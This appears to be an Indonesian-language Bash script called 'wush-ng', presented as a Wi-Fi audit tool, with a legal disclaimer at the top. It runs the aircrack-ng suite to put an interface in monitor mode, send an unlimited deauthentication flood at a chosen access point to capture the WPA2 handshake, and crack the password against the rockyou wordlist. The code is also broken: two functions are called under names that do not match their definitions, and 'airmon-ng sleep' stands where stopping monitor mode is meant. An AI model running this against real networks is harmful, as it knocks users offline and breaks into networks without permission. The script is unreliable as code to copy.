#!/bin/bash
# Program..............: wush-ng
# Deskripsi............: Perangkat Lunak Audit Keamanan Wi-Fi 
# pembuat..............: Rofi
# Versi................: 1.0.0
# Github...............: https://github.com/rofidoang03/wush-ng.git
#
############################################################################
#
# ~ PERINGATAN ~
# 
# Penyalahgunaan atau penggunaan program ini untuk
# aktivitas ilegal dilarang keras. Program ini
# disediakan semata-mata untuk tujuan pembelajaran dan
# pengujian keamanan jaringan yang sah. Pengguna
# bertanggung jawab penuh atas penggunaan dan
# konsekuensi yang timbul dari penggunaan program ini.
#
# DILARANG KERAS menggunakan program ini tanpa izin
# atau untuk tujuan merusak atau melanggar hukum.
# Segala tindakan ilegal diluar tanggung jawab
# pembuat program.
#
# DENGAN MENGGUNAKAN PROGRAM INI, ANDA MENYATAKAN
# BAHWA ANDA MEMAHAMI DAN MENERIMA SYARAT DAN KETENTUAN
# DIATAS.
#
############################################################################

function cek_root(){
        if [[ "$EUID" -ne 0 ]]; then
	        echo "[-]  Program ini harus dijalankan sebagai root."
	        exit 1
        fi
}

function pemilihan_antar_muka_jaringan(){
        clear
        echo ""
        echo "************** Pemilihan Antarmuka Jaringan **************"
        echo ""
        echo "Pilih antarmuka jaringan untuk digunakan:"
        echo "--------------"

        # antarmuka jaringan yang tersedia
        ajyt=($(iw dev | awk '/Interface/{print $2}'))
        for ((i=0; i<"${#ajyt[@]}"; i++)); do
	        echo "${i}. ${ajyt[$i]}"
        done
        echo ""

        while true; do
	        # input memilih antar muka jaringan
                read -p "[»] " imaj

                if [[ "${imaj}" =~ ^[0-9]+$ ]] && (( imaj >= 0 && imaj < ${#ajyt[@]} )); then
 		        # antarmuka jaringan
            	        aj="${ajyt[$imaj]}"
            	        break
                else
            	        echo "[-] Antarmuka jaringan ${imaj} tidak ditemukan. Silahkan pilih lagi."
                fi
        done
}

function mengaktifkan_mode_monitor(){
        echo ""
        echo "[*] Mengaktifkan mode monitor pada antarmuka jaringan ${aj} menggunakan airmon-ng..."
        sleep 3
        airmon-ng check kill
        airmon-ng start "${aj}"
}

function menonaktifkan_mode_monitor(){
        echo ""
        echo "[*] Menonaktifkan mode monitor pada antarmuka jaringan ${aj} menggunakan airmon-ng..."
        sleep 3
        airmon-ng sleep "${aj}"
	systemctl restart NetworkManager
}

function memindai_jaringan_wifi(){
        echo "[*] Memindai jaringan Wi-Fi menggunakan airodump-ng pada antarmuka jaringan ${aj}..."
        sleep 3
        airodump-ng "${aj}"
        echo ""
}

function menu_alat_handshake(){
        while true; do
	read -p "Silahkan masukkan alamat MAC Access Point (BSSID): " b
	if [[ -z "${b}" ]] || [[ ! "${b}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    		echo "[-] Alamat MAC Access Point (BSSID) tidak benar. Harap masukkan alamat MAC Access Point (BSSID) yang benar (contoh: XX:XX:XX:XX:XX:XX)."
	else
		while true; do
			read -p "Silahkan masukkan nomor channel yang digunakan oleh Access Point: " c
			if [[ -z "${c}" ]] || ! [[ "${c}" =~ ^[0-9]+$ ]]; then
				echo "[-] Nomor channel tidak benar. Harap masukkan nomor channel yang benar."
			else
				        # posisi airodump-ng
				        pa="80x24+0+0"
				        # posisi aireplay-ng
				        pg="80x24-0+0"

                             	        # timeout airodump-ng
                                        tp=28
				        waktu=$(date +"%Y-%m-%d_%H:%M:%S")
				        # nama untuk file handshake
				        nufh="${b}_${waktu}"
				        echo ""
				        echo "[*] Menangkap Handshake menggunakan airodump-ng pada antarmuka jaringan ${aj}..."
				        sleep 3
		                        xterm -geometry "${pa}" -e "timeout ${tp} airodump-ng --bssid ${b} --channel ${c} --write ${nufh} ${aj}" &
	                                airodump_pid=$!
				        sleep 5
				        # timeout aireplay-ng
				        ty=20
				        echo "[*] Mengirimkan paket deauthentikasi menggunakan aireplay-ng pada antarmuka jaringan ${aj}..."
				        sleep 3
				        xterm -geometry "${pg}" -e "timeout ${ty} aireplay-ng --deauth 0 -a ${b} ${aj}" &
				        aireplay_pid=$!
				        # menunggu proses airodump-ng dan aireplay-ng
				        wait "${airodump_pid}"
				        wait "${aireplay_pid}"
                                        # file handshake yang akan digunakan untuk memecahkan kata sandi jaringan WPA2.'
                                        fh="${nufh}-01.cap"
                                        # folder untuk menyimpan file handshake
                                        ffh="/usr/share/wush-ng/file_handshake/"
                                        # menghapus semua file csv dan xml
                                        rm *csv *xml
                                        mv "${fh}" "${ffh}"
                                        echo "[+] File Handshake tersimpan di: ${ffh}${fh}."
                                        sleep 3
				        break
			        fi
		        done
		        break
	        fi
        done
}

function mendeskripsi_kata_sandi_jaringan_wpa2(){
        # wordlist default yang digunakan oleh wush-ng
        wordlist="/usr/share/wush-ng/wordlists/rockyou.txt"
        echo "[*] Mendeskripsi kata sandi jaringan WPA2 menggunakan aircrack-ng pada file Handshake  ${ffh}${fh}."
        sleep 3
        aircrack-ng -w "${wordlist}" "${ffh}${fh}"
}

function wush-ng(){
        while true; do
                clear
                echo "************** Menu Utama wush-ng **************"
		echo ""
                echo "Silahkan pilih opsi dari menu:"
		echo "--------------"
                echo "1. Pilih antarmuka jaringan yang lain"
		echo "2. Aktifkan mode monitor"
                echo "3. Nonaktifkan mode monitor"
		echo "--------------"
                echo "4. Menu alat handshake"
		echo "5. Deskripsi kata sandi jaringan WPA2"
                echo "--------------"
		echo "6. Tentang, Dukung Saya"
                echo "7. Keluar"
		echo "--------------"
                read -p "[»] " main
		case "${main}" in
                        1)
			        pemilihan_antarmuka_jaringan
	                        ;;
                        2)
			        mengaktifkan_mode_monitor
	                        ;;
			3)
                                menonaktifkan_mode_monitor
				;;
                        4)
                                menu_alat_handshake
                                ;;
			5)
                                mendeskripsi_kata_sandi_jaringan_wp2
				;;
                        6) 
			        echo "Masih dalam tahap pengembangan 😁"
	                        ;;
	                7)
		                exit 0
		                ;;
		        *)
	                        echo "Masih dalam tahap pengembangan 😁"
			        ;;
	           esac
			                      
	done
}

function wush(){
        pemilihan_antarmuka_jaringan
	wush-ng
}

wush
